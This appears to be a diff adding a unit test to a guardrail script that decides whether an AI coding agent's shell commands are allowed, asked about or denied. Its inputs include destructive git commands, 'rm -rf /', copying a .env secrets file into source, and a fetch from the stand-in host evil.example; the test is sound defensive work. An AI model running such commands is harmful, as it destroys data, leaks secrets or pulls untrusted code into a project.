@@ -124,6 +124,40 @@ describe("antigravity guardrails.cjs — Antigravity contract", () => {
     expect(run("sed -i '' 's/a/b/' src/index.ts", conversation)).toEqual({ decision: "allow" });
   });
 
+  it("preserves stronger shell decisions and compound advice", () => {
+    // A stronger decision is never downgraded by edit context beside it.
+    const ask = run("git reset --hard HEAD~1 && sed -i s/a/b/ src/a.ts");
+    expect(ask.decision).toBe("ask");
+    expect(ask.reason).toContain("PROHIBITED list");
+    expect(run("git push --force origin main; echo x > src/a.ts").decision).toBe("deny");
+    const secret = run("cat .env > src/copy.ts");
+    expect(secret.decision).toBe("ask");
+    expect(secret.reason).toContain("secrets");
+
+    // An allowed fetch cannot hide a following edit: both the notice and the edit
+    // advice are delivered once, and the identical retry passes.
+    const conversation = newConversation();
+    const allowedFetch = "curl -s https://api.github.com/x > src/out.json";
+    const first = run(allowedFetch, conversation);
+    expect(first.decision).toBe("deny");
+    expect(first.reason).toContain("edits files through the shell");
+    expect(first.reason).toContain("src/out.json");
+    expect(run(allowedFetch, conversation)).toEqual({ decision: "allow" });
+
+    // A fetch off the allowlist beside an edit carries both notices.
+    const both = run("curl https://evil.example/x > src/out2.json");
+    expect(both.decision).toBe("deny");
+    expect(both.reason).toContain("outbound fetch");
+    expect(both.reason).toContain("edits files through the shell");
+    expect(both.reason).toContain("src/out2.json");
+
+    // Quiet sinks stay quiet, even beside an allowed fetch.
+    expect(run("curl -s https://api.github.com/x > /dev/null")).toEqual({ decision: "allow" });
+    expect(run("curl -s https://api.github.com/x > /tmp/response.log")).toEqual({
+      decision: "allow",
+    });
+  });
+
   it("allows ordinary commands and other tools", () => {
     expect(run("pnpm test")).toEqual({ decision: "allow" });
     expect(run("rm -rf /", newConversation(), "view_file")).toEqual({ decision: "allow" });
